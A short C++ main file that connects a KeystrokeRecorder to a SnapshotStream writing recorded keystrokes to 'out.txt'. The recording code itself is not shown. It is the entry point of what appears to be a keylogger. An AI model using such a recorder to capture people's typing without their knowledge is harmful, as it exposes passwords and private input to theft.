#include <iostream>
#include "keystroke_recorder.h"
#include "snapshot_stream.h"

int main()
{
    auto snapshotStream = std::make_shared<SnapshotStream>("out.txt");

    KeystrokeRecorder keystrokeRecorder;
    keystrokeRecorder.registerRecorder(snapshotStream);

}